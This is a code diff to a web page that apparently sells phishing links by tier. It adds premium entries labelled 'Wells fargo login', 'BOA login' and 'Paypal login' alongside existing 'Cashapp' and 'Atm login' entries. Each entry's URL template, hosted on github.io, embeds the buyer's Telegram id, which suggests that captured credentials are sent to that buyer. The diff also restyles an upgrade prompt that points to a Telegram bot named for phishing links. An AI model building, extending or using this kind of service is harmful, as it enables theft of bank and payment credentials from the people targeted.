@@ -326,7 +326,7 @@
         name: "Cashapp",
         image: "https://rrloaty.github.io/intelligent/cash.png",
         urlTemplate: "https://rrloaty.github.io/a/cash.html?id={telegram-id}"
-      }
+      },
       // Add more free links here as needed
     ];
 
@@ -356,7 +356,23 @@
         name: "Atm login for all country",
         image: "https://bbott52.github.io/Mobixhub/image.png",
         urlTemplate: "https://bbott52.github.io/Mobixhub/?promo={telegram-id}"
-      }
+      },
+                  {
+        name: "Wells fargo login",
+        image: "https://bbott52.github.io/Mobixhub/image.png",
+        urlTemplate: "https://bbott52.github.io/Mobixhub/?promo={telegram-id}"
+      },
+                  {
+        name: "BOA login",
+        image: "https://bbott52.github.io/Mobixhub/image.png",
+        urlTemplate: "https://bbott52.github.io/Mobixhub/?promo={telegram-id}"
+      },
+                  {
+        name: "Paypal login",
+        image: "https://bbott52.github.io/Mobixhub/image.png",
+        urlTemplate: "https://bbott52.github.io/Mobixhub/?promo={telegram-id}"
+      },
+      
       // Add more premium links here
     ];
 
@@ -449,13 +465,36 @@
         html += "</ul>";
         premiumContent.innerHTML = html;
       } else {
-        // Show upgrade message
-        premiumContent.innerHTML = `
-          <p style="color:#ffcc00; font-weight:700; text-align:center; margin-top: 20px;">
-            Go premium to view or copy these links.<br>
-            Message <a href="https://t.me/inamyophisintlinkbot" target="_blank" rel="noopener noreferrer" style="color:#00ff99; font-weight:700;">@inamyophisintlinkbot</a> to upgrade.
-          </p>
-        `;
+// Show upgrade message
+premiumContent.innerHTML = `
+  <div style="max-width:500px;margin:20px auto;padding:16px;border-radius:16px;background:#151933;color:#e9ecff;font-family:system-ui,Roboto,Arial;">
+    <div style="position:relative;aspect-ratio:16/9;background:#0c0f20;border-radius:12px;overflow:hidden;">
+      <img src="https://images.unsplash.com/photo-1545239351-1141bd82e8a6?q=80&w=1200&auto=format&fit=crop" alt="Premium" style="width:100%;height:100%;object-fit:cover;display:block;">
+      <span style="position:absolute;top:12px;left:12px;background:linear-gradient(135deg,#f5c673,#d89b2b);color:#1a1205;font-weight:700;font-size:12px;padding:6px 10px;border-radius:999px;letter-spacing:.3px;">PREMIUM</span>
+    </div>
+
+    <h3 style="margin:14px 0 8px;font-size:18px;font-weight:700;display:flex;align-items:center;gap:6px;">
+      <span>🔒</span> Premium Link 1
+    </h3>
+    <p style="margin:0 0 12px;color:#97a0c3;font-size:14px;">
+      Go premium before you can copy or paste this link.
+    </p>
+
+    <div style="display:flex;gap:8px;align-items:center;">
+      <input type="text" value="https://example.com/your-premium-link" disabled 
+             style="flex:1;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.06);color:#b9c0e0;font-size:14px;-webkit-text-security:disc;">
+      <button disabled style="padding:10px 14px;border:none;border-radius:10px;background:#6c8cff;color:#0a0e22;font-weight:700;cursor:not-allowed;opacity:.6;">Copy</button>
+    </div>
+
+    <div style="margin-top:14px;padding:10px;border:1px dashed rgba(245,198,115,.5);background:rgba(255,213,133,.08);border-radius:10px;font-size:13px;display:flex;gap:10px;align-items:center;">
+      Access locked. Upgrade to unlock this link.
+      <a href="https://t.me/inamyophisintlinkbot" target="_blank" rel="noopener noreferrer"
+         style="margin-left:auto;background:linear-gradient(135deg,#f5c673,#d89b2b);color:#1a1205;padding:8px 12px;border-radius:8px;font-weight:700;text-decoration:none;">
+        Go Premium
+      </a>
+    </div>
+  </div>
+`;
       }
     }
 
